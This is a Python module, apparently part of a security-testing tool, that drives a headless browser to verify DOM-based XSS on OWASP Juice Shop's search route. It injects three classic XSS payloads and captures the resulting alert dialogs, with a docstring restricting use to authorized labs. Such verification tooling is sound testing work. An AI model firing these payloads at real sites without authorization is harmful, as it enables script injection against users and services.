from __future__ import annotations

import time
from dataclasses import dataclass
from urllib.parse import quote

from juicechain.utils.logging import get_logger


logger = get_logger(__name__)


@dataclass
class DomXssResult:
    ok: bool
    url: str
    payload: str
    dialog_message: str | None
    error: str | None
    duration_ms: int


def build_search_fragment_url(base: str, payload: str) -> str:
    # Juice Shop SPA search route: /#/search?q=...
    # payload is passed via hash-fragment query, and must be URL encoded.
    enc = quote(payload, safe="")
    return f"{base}/#/search?q={enc}"


def verify_dom_xss_on_search(
    *,
    base: str,
    headless: bool = True,
    timeout_ms: int = 8000,
) -> DomXssResult:
    """
    DOM-XSS verification via browser dialog capture (alert/confirm/prompt).
    Only use on authorized targets / local labs.
    """
    t0 = time.time()
    logger.info("dom-xss browser verification start: base=%s", base)

    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        logger.warning("dom-xss browser dependency missing: %s", e)
        return DomXssResult(
            ok=False,
            url="",
            payload="",
            dialog_message=None,
            error=f"playwright not available: {type(e).__name__}: {e}",
            duration_ms=int((time.time() - t0) * 1000),
        )

    # Try multiple payloads to reduce overfitting to a single case.
    payloads = [
        "\"><svg/onload=alert('JC_DOM_XSS')>",
        "<img src=x onerror=alert('JC_DOM_XSS')>",
        "<script>alert('JC_DOM_XSS')</script>",
    ]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=headless)
        page = browser.new_page()

        dialog_msgs: list[str] = []

        def on_dialog(d) -> None:
            try:
                dialog_msgs.append(d.message)
                d.dismiss()
            except Exception:
                pass

        page.on("dialog", on_dialog)

        try:
            for payload in payloads:
                url = build_search_fragment_url(base, payload)
                page.goto(url, wait_until="networkidle", timeout=timeout_ms)
                # Give the frontend a short time window to trigger sink execution.
                page.wait_for_timeout(800)

                if dialog_msgs:
                    browser.close()
                    logger.info("dom-xss dialog captured: url=%s", url)
                    return DomXssResult(
                        ok=True,
                        url=url,
                        payload=payload,
                        dialog_message=dialog_msgs[-1],
                        error=None,
                        duration_ms=int((time.time() - t0) * 1000),
                    )

            browser.close()
            logger.info("dom-xss verification finished without dialog")
            return DomXssResult(
                ok=False,
                url=build_search_fragment_url(base, payloads[0]),
                payload=payloads[0],
                dialog_message=None,
                error=None,
                duration_ms=int((time.time() - t0) * 1000),
            )

        except Exception as e:
            try:
                browser.close()
            except Exception:
                pass
            logger.warning("dom-xss verification runtime error: %s", e)
            return DomXssResult(
                ok=False,
                url="",
                payload="",
                dialog_message=None,
                error=f"{type(e).__name__}: {e}",
                duration_ms=int((time.time() - t0) * 1000),
            )
